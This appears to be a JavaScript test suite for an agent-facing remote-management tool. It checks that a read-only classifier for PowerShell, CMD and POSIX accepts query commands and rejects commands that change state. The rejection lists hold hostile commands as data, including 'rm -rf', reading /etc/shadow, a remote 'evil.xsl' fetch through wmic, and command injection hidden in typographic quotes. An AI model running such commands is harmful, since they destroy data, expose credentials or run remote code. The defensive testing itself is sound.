import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isReadOnlyPowerShell as ps, isReadOnlyCmd as cmd, isReadOnlyPosix as sh } from '../src/readonly.js';
import { ConfirmationGate } from '../src/safety.js';

test('PowerShell: read-only queries pass', () => {
  for (const c of [
    'Get-Service MeshAgent',
    'Get-Service -Name "Mesh Agent" | Select-Object Status, StartType',
    "Get-WinEvent -LogName System -MaxEvents 50 | Format-Table -AutoSize",
    "Get-WinEvent -FilterHashtable @{LogName='Application'; Level=2; StartTime=(Get-Date).AddDays(-1)} -MaxEvents 100",
    'Get-Process | Where-Object { $_.CPU -gt 100 } | Sort-Object CPU -Descending | Select-Object -First 10',
    'Get-EventLog -LogName System -Newest 20 2>$null',
    'gci C:\\Windows\\Logs | sort LastWriteTime | select -Last 5',
    'Get-Content C:\\ProgramData\\app.log -Tail 200',
    'Get-Process | Select-Object Name, @{n="MB"; e={ $_.WorkingSet / 1MB }}',
    'Test-NetConnection example.com -Port 443',
    'ipconfig /all',
    'Get-ChildItem Env: | Out-String',
    '"$env:COMPUTERNAME"',
  ]) assert.equal(ps(c), true, c);
});

test('PowerShell: anything that can change state is rejected', () => {
  for (const c of [
    'Stop-Service MeshAgent',
    'Get-Process notepad | Stop-Process',
    'Get-Service x; Restart-Computer',
    'Get-Process | ForEach-Object { $_.Kill() }',
    'Get-Process | % Kill',
    '(Get-Item C:\\x).Delete()',
    '[System.IO.File]::Delete("C:\\x")',
    'Get-Content x > y.txt',
    'Get-Content x | Out-File y.txt',
    'iex (Get-Content x)',
    '& "C:\\evil.exe"',
    '. .\\script.ps1',
    '$x = Get-Process',
    'Get-Process | Invoke-Expression',
    '"$(Remove-Item x)"',
    'Get-ChildItem `\n; rm x',
    'Get-Credential',
    '$ExecutionContext.InvokeCommand.InvokeScript("rm x")',
    'Get-Process\nStop-Process -Id 4',
    'ipconfig /release',
    'net user bob hunter2',
    'sc stop MeshAgent',
    'Get-WmiObject Win32_Process | Invoke-WmiMethod -Name Terminate',
    'Get-Process | Where-Object { Remove-Item x }',
    'Get-WindowsUpdate -Install -AcceptAll',
  ]) assert.equal(ps(c), false, c);
});

test('CMD rules', () => {
  for (const c of ['ipconfig /all', 'sc query MeshAgent', 'tasklist | findstr mesh', 'wevtutil qe System /c:20 /rd:true /f:text',
    'net user', 'net localgroup administrators', 'reg query HKLM\\Software\\Mesh', 'dir C:\\ 2>nul', 'wmic os get caption'])
    assert.equal(cmd(c), true, c);
  for (const c of ['sc stop MeshAgent', 'net user bob pw', 'net user bob /add', 'dir & del x', 'type a > b', 'wevtutil cl System',
    'ipconfig /flushdns', 'wmic process call create calc', 'reg add HKLM\\x', 'date', 'schtasks /run /tn x', 'echo ^& del x',
    'wmic os get /format:"http://x/evil.xsl"', 'echo %X%'])
    assert.equal(cmd(c), false, c);
});

test('POSIX rules', () => {
  for (const c of ['systemctl status meshagent', 'journalctl -u meshagent --since "1 hour ago" -n 200 --no-pager',
    'tail -n 100 /var/log/syslog | grep -i error', 'ps aux | grep mesh', 'df -h', 'ip addr show', 'ss -tlnp',
    'find /var/log -name "*.log" -mtime -1', 'cat /etc/os-release 2>/dev/null', 'dmesg -T | tail -50'])
    assert.equal(sh(c), true, c);
  for (const c of ['systemctl restart meshagent', 'rm -rf /tmp/x', 'cat a > b', 'ls; reboot', 'ls && reboot', 'echo $(id)',
    'echo `id`', 'find / -name x -delete', 'find . -exec rm {} +', 'sed -i s/a/b/ f', 'awk \'{system("id")}\'', 'ip link set eth0 down',
    'journalctl --vacuum-time=1d', 'sort -o f f', 'dmesg -c', 'sudo cat /etc/shadow', 'cat x | tee y', 'ls | xargs rm', '/bin/rm x',
    'FOO=1 ls', 'date -s 2020-01-01', 'hostname evil',
    'sort --compress-program=sh f', 'ss -K dst 1.2.3.4', 'ip -batch addr'])
    assert.equal(sh(c), false, c);
});

test('ConfirmationGate: session grant by tool and tier skips later prompts', async () => {
  const asked = [];
  const fakeServer = {
    getClientCapabilities: () => ({ elicitation: {} }),
    elicitInput: async (params, opts) => {
      asked.push({ params, opts });
      return { action: 'accept', content: { decision: asked.length === 1 ? 'tool' : 'tier' } };
    },
  };
  const gate = new ConfirmationGate({ mode: 'auto', server: fakeServer, elicitTimeoutMs: 1234 });
  assert.equal(await gate.check('mesh_run_command', 'Run on A [PowerShell]: x', {}, 'X'), null);
  assert.equal(asked[0].opts.timeout, 1234);
  assert.match(asked[0].params.message, /^Run on A \[PowerShell\]: x/); // action first
  assert.equal(await gate.check('mesh_run_command', 'again', {}, 'X'), null);
  assert.equal(asked.length, 1); // tool grant reused
  assert.equal(await gate.check('mesh_terminal_input', 'y', {}, 'X'), null);
  assert.equal(asked.length, 2); // different tool, asked; granted whole tier
  assert.equal(await gate.check('mesh_desktop_click', 'z', {}, 'X'), null);
  assert.equal(asked.length, 2);
  assert.equal(gate.isGranted('mesh_file_delete', 'WF'), false);
});

test('ConfirmationGate: an unanswered prompt does not degrade to token mode', async () => {
  const fakeServer = {
    getClientCapabilities: () => ({ elicitation: {} }),
    elicitInput: async () => { throw new Error('Request timed out'); },
  };
  const gate = new ConfirmationGate({ mode: 'auto', server: fakeServer });
  const r = await gate.check('mesh_run_command', 'x', {}, 'X');
  assert.equal(r.isError, true);
  assert.doesNotMatch(r.content[0].text, /confirm_token/);
});

test('PowerShell: typographic quotes and dashes are rejected (PowerShell treats them as quotes / "-")', () => {
  assert.equal(ps("Get-ChildItem 'x\u2018; Remove-Item -Recurse C:\\Data; \u2018'"), false);
  assert.equal(ps('Get-ChildItem \u201Cx\u201D'), false);
  assert.equal(ps('Get-ChildItem \u2013Recurse C:\\'), false);
  assert.equal(ps("Get-ChildItem 'x'"), true);
});

test('psQuote doubles ASCII and typographic single quotes', async () => {
  const { psQuote } = await import('../src/safety.js');
  assert.equal(psQuote("a'b"), "'a''b'");
  assert.equal(psQuote('x\u2018; Remove-Item C:\; \u2019'), "'x\u2018\u2018; Remove-Item C:\; \u2019\u2019'");
});

test('ConfirmationGate: mode off still prompts when forcePrompt is set (agent disruption)', async () => {
  const gate = new ConfirmationGate({ mode: 'off' });
  assert.equal(await gate.check('mesh_run_command', 'x', {}, 'X'), null);
  const r = await gate.check('mesh_run_command', 'x', {}, 'X', { forcePrompt: true });
  assert.match(r.content[0].text, /CONFIRMATION REQUIRED/);
});
